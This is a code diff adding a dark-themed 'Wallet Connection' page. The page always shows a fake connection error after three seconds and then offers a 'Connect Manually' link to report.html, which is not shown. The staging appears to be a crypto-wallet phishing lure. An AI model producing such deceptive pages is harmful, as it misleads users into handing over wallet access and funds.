@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wallet Connection</title>
+<style>
+body{font-family:Inter,Arial;background:#0b0720;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;margin:0}
+.container{max-width:400px}
+h1{font-size:22px;margin-bottom:12px}
+.status{font-size:18px;margin-top:10px;color:#f55}
+.button{margin-top:18px;background:#fff;color:#0b0720;padding:10px 20px;border-radius:8px;text-decoration:none;display:inline-block;font-weight:600}
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Connecting...</h1>
+    <p class="status" id="statusText">Please wait...</p>
+  </div>
+<script>
+setTimeout(()=>{ 
+ document.getElementById('statusText').innerHTML='Error Connecting..<br><br><a class="button" href="report.html">Connect Manually</a>';
+},3000);
+</script>
+</body>
+</html>
